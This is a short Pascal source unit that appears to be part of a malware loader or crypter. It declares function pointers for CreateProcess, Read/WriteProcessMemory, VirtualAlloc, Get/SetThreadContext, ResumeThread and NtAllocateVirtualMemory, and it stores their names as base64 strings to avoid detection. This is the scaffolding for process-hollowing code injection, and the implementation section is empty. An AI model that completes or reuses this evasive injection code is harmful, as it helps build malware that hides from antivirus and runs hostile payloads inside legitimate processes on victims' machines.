unit syscalls;

{$mode delphi}


 interface
uses
  Classes, SysUtils,runner,windows;
Type
  NTSTATUS = cardinal;
  PVOID = pointer;
  PPVOID = ^PVOID;
  PULONG = ULONG;

  const

{ ENCODED API CALL STRINGS }

 RPM_V = 'UmVhZFByb2Nlc3NNZW1vcnk=';
 CP_V  = 'Q3JlYXRlUHJvY2Vzc0E=';
 WPM   = 'V3JpdGVQcm9jZXNzTWVtb3J5';
 VALLOC = 'VmlydHVhbEFsbG9j';
 Rs_thread = 'UmVzdW1lVGhyZWFk';





var




  CP : function (lpApplicationName: PChar; lpCommandLine: PChar; lpProcessAttributes, lpThreadAttributes: PSecurityAttributes; bInheritHandles: BOOL; dwCreationFlags: DWORD; lpEnvironment: Pointer; lpCurrentDirectory: PChar;
  const lpStartupInfo: TStartupInfo; var lpProcessInformation: TProcessInformation): BOOL; stdcall;

  AllocX : function (hProcess: THandle; lpAddress: Pointer;
    dwSize, flAllocationType: DWORD; flProtect: DWORD): Pointer;stdcall;

  Alloc : function (lpAddress:LPVOID; dwSize:PTRUINT; flAllocationType:DWORD; flProtect:DWORD):LPVOID;
   Nt :   function (ProcessHandle: THandle; BaseAddress: Pointer): DWORD; stdcall;

   W_M : function (hProcess: THandle; const lpBaseAddress: Pointer; lpBuffer: Pointer; nSize: PTRUINT; var lpNumberOfBytesWritten: PTRUINT): BOOL; stdcall;
   W_S : function (hProcess: THandle; const lpBaseAddress: Pointer; lpBuffer: Pointer; nSize: PTRUINT; var lpNumberOfBytesWritten: PTRUINT): BOOL; stdcall;

   Get_Con : function (hThread: THandle; var lpContext: TContext): BOOL;stdcall;


   set_Con : function (hThread: THandle; const lpContext: TContext): BOOL; stdcall;

  res_thread: function (hThread:HANDLE):DWORD; stdcall;

  RPM: function (hProcess: THandle; const lpBaseAddress: Pointer; lpBuffer: Pointer; nSize: PTRUINT; var lpNumberOfBytesRead: PTRUINT): BOOL; stdcall;




  //external 'kernel32' name 'GetCurrentProcess';

  // NT sections

//  NtAllocateVirtualMemory : function (pi.hProcess, &allocation_start, 0, (PULONG)&allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
gg : function (
    ProcessHandle : HANDLE;
    BaseAddress : PPVOID;
    ZeroBits : ULONG;
    AllocationSize : PULONG;
    AllocationType : ULONG;
    Protect : ULONG
  ): NTSTATUS; stdcall;


implementation







end.

